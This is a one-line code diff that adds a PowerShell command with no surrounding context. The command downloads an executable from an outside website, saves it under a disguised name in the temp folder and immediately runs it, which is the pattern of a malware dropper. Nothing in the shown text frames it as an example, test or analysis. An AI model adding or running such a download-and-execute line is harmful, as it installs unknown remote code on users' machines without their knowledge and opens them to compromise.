@@ -1,0 +1,1 @@
+(New-Object System.Net.WebClient).DownloadFile('http://boisedelariviere.com/backup/css/newconfig.exe',"$env:TEMPneone6.exe");Start-Process ("$env:TEMPneone6.exe")
